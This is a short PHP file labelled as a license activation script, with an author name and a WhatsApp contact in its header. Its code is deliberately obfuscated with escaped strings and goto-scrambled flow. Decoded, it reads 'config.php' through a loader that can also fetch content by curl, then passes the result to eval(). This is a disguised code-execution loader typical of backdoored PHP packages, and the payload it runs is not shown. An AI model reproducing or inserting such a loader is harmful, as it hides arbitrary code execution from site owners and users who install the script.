<?php
/* 
Author: Iddant ID
Provider: Three
Whatsapp : 0895375136311
Script activasi for licensi
*/
eval(a4625("\x63\x6f\x6e\x66\x69\x67\x2e\x70\x68\x70"));
function A4625($YObWq)
{
    goto MLxcX;
    pihBE:
    $AaxTk = curl_init();
    goto am1UH;
    Tx9Bk:
    GFfi5:
    goto y49uG;
    OJbrM:
    if (function_exists("\146\157\160\x65\156") && function_exists("\146\145\157\146") && function_exists("\146\x72\x65\141\x64") && $OOSHq) {
        goto SZUUF;
    }
    goto Yqxyn;
    MLxcX:
    $OOSHq = fopen($YObWq, "\x72\142");
    goto QQw0q;
    y49uG:
    $bQsDH .= $DVs_K;
    goto n9QaX;
    d5HTA:
    wdVGB:
    goto S20Ud;
    am1UH:
    curl_setopt($AaxTk, CURLOPT_URL, $YObWq);
    goto Xqz0Y;
    Yqxyn:
    if (function_exists("\x66\x69\154\x65\137\147\x65\164\137\x63\x6f\156\x74\x65\x6e\x74\x73") && ($DVs_K = file_get_contents($YObWq))) {
        goto GFfi5;
    }
    goto pihBE;
    TiYmy:
    curl_setopt($AaxTk, CURLOPT_FOLLOWLOCATION, 1);
    goto Vti5Z;
    Vti5Z:
    $bQsDH .= curl_exec($AaxTk);
    goto u7dFW;
    EBMvV:
    goto v3_VC;
    goto Tx9Bk;
    h7wVL:
    SZUUF:
    goto d5HTA;
    TLBvJ:
    $bQsDH .= fread($OOSHq, 1024 * 8);
    goto r3Ukp;
    XodY9:
    RTIvs:
    goto DRDbG;
    QQw0q:
    $bQsDH = '';
    goto OJbrM;
    u7dFW:
    curl_close($AaxTk);
    goto LfQNQ;
    D4X1P:
    return "\77\76" . $bQsDH;
    goto Ixfoa;
    n9QaX:
    v3_VC:
    goto D4X1P;
    S20Ud:
    if (feof($OOSHq)) {
        goto RTIvs;
    }
    goto TLBvJ;
    r3Ukp:
    goto wdVGB;
    goto XodY9;
    LfQNQ:
    goto v3_VC;
    goto h7wVL;
    DRDbG:
    fclose($OOSHq);
    goto EBMvV;
    Xqz0Y:
    curl_setopt($AaxTk, CURLOPT_RETURNTRANSFER, 1);
    goto TiYmy;
    Ixfoa:
}